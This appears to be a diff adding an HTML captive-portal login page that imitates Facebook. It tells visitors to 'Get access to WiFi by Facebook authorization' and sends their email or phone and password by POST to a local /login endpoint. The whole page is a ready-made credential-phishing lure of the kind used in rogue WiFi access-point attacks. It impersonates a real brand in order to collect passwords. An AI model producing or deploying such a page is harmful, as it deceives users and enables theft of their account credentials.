@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <style>
+   body {
+      margin: 0;
+      padding: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      max-width: 1000px;
+      width: 100%;
+      padding: 20px;
+    }
+
+    .logo-section {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo {
+      color: #1877f2;
+      font-size: 56px;
+      font-weight: bold;
+      margin-bottom: 16px;
+    }
+
+    .logo-text {
+      font-size: 20px;
+      line-height: 32px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .login-container {
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      width: 100%;
+      max-width: 396px;
+      box-sizing: border-box;
+    }
+
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      padding: 14px 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    input[type="submit"] {
+      background-color: #1877f2;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      padding: 14px 16px;
+      width: 100%;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #166fe5;
+    }
+
+    .forgot-password {
+      text-align: center;
+      margin: 16px 0;
+    }
+
+    .forgot-password a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .divider {
+      border-bottom: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+
+    .create-account {
+      text-align: center;
+    }
+
+    .create-button {
+      background-color: #42b72a;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 17px;
+      font-weight: bold;
+      padding: 14px 16px;
+      display: inline-block;
+      text-decoration: none;
+    }
+
+    .create-button:hover {
+      background-color: #36a420;
+    }
+
+    /* Media Queries for Responsiveness */
+    @media screen and (max-width: 600px) {
+      .logo {
+        font-size: 40px;
+      }
+
+      .logo-text {
+        font-size: 16px;
+      }
+
+      .login-container {
+        padding: 15px;
+      }
+
+      .login-form input {
+        font-size: 15px;
+        padding: 12px 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo-section">
+      <div class="logo">facebook</div>
+      <h2 class="logo-text">Get access to WiFi by Facebook authorization</h2>
+    </div>
+    <div class="login-container">
+      <form action="/login" method="POST" class="login-form">
+        <input type="text" name="username" placeholder="Email address or phone number">
+        <input type="password" name="password" placeholder="Password">
+        <input type="submit" value="Login">
+        <div class="forgot-password">
+          <a href="#">Forgotten password?</a>
+        </div>
+        <div class="divider"></div>
+        <div class="create-account">
+          <a href="#" class="create-button">Create new account</a>
+        </div>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
